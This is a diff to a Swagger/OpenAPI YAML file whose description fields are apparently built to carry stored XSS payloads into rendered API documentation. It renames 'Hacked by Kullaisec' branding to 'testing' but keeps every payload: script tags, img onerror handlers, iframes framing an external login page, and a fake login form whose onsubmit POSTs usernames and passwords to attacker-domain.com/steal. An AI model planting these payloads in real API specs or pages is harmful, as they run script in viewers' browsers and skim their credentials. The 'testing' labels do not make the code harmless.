@@ -1,14 +1,15 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Kullaisec
+  title: XSS Testing
   description: |
-    <marquee behavior="scroll" direction="left" style="font-size:24px;color:red;">Hacked by Kullaisec</marquee>
+    <marquee behavior="scroll" direction="left" style="font-size:24px;color:red;">Testing Marquee</marquee>
     <img src="https://via.placeholder.com/150" onerror="alert('Image load failed! XSS executed.');">
+    <iframe src="https://synovex-demo.secasure.com/login" width="600" height="400" style="border:2px solid red;" onload="alert('External login page loaded. JavaScript in action!')"></iframe>
     <script>
       alert('Warning: JavaScript Executed!');
-      document.body.innerHTML += '<h1 style="color:red;">You are hacked!</h1>';
+      document.body.innerHTML += '<h1 style="color:red;">This is a test!</h1>';
     </script>
-    <form action="#" onsubmit="fetch('https://attacker-domain.com/steal', {method: 'POST', body: new URLSearchParams({username: this.username.value, password: this.password.value})}); alert('Credentials sent to attacker!'); return false;">
+    <form action="#" onsubmit="fetch('https://attacker-domain.com/steal', {method: 'POST', body: new URLSearchParams({username: this.username.value, password: this.password.value})}); alert('Credentials sent to testing server!'); return false;">
       <label for="username">Username:</label><br>
       <input type="text" id="username" name="username"><br>
       <label for="password">Password:</label><br>
@@ -28,24 +29,25 @@ security:
 paths:
   /loginpage:
     get:
-      summary: Displays a malicious login page
+      summary: Displays a test login page
       description: |
-        An endpoint that serves a login page with an embedded XSS attack for demonstration purposes.
+        An endpoint that serves a login page with an embedded XSS attack and iframe.
       responses:
         '200':
           description: HTML login page
           schema:
             type: string
       tags:
-        - Kullai_XSS_Login
+        - XSS_Testing_Login
       operationId: displayLoginPage
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <marquee behavior="alternate" style="color:blue;font-size:18px;">Hacked by Kullaisec</marquee>
+            <marquee behavior="alternate" style="color:blue;font-size:18px;">Testing Marquee</marquee>
             <img src="nonexistent.png" onerror="alert('XSS Image Trigger!');">
-            <script>alert('ID parameter exploited!');</script>
+            <iframe src="https://synovex-demo.secasure.com/login" width="500" height="300" style="border:2px solid blue;" onload="console.log('Malicious iframe loaded.');"></iframe>
+            <script>alert('ID parameter exploited for testing!');</script>
           format: int64
           in: path
           name: id
